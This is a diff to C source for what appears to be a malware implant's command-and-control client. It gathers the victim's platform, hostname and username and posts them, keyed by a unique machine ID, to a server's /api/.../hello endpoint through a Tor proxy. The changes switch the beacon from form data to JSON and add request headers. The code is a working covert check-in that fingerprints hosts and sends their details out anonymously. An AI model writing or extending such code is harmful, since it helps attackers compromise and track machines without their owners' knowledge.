@@ -114,6 +114,12 @@ char* postRequest(char *path, char *post_data)
       char url[BUFFER_SIZE];
       strcpy(url, URL);
       strcat(url, path);
+      printf("%s",post_data);
+      struct curl_slist *headers = NULL;
+      headers = curl_slist_append(headers, "Accept: application/json");
+      headers = curl_slist_append(headers, "Content-Type: application/json");
+      headers = curl_slist_append(headers, "charset: utf-8");
+      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
       curl_easy_setopt(curl, CURLOPT_URL, url);
       curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
       curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
@@ -134,7 +140,10 @@ char* sayhello()
     char *path = malloc(BUFFER_SIZE);
     char *post_data = malloc(BUFFER_SIZE);
     sprintf(path, "/api/%s/hello", getUniqueID());
-    sprintf(post_data, "platform=%s&hostname=%s&username=%s",
+    sprintf(post_data,
+            "{\"platform\": \"%s\",\
+             \"hostname\": \"%s\",\
+             \"username\": \"%s\"}",
             PLATFORM,HOSTNAME,USERNAME);
     data = postRequest(path, post_data);
     return data;
@@ -155,7 +164,7 @@ void setup()
     #elif __LINUX__
         PLATFORM = "LINUX";
     #else
-        PLATFORM = "UNKNOWN";
+        PLATFORM = "NONE";
     #endif
     gethostname(HOSTNAME, BUFFER_SIZE);
     getlogin_r(USERNAME, BUFFER_SIZE);
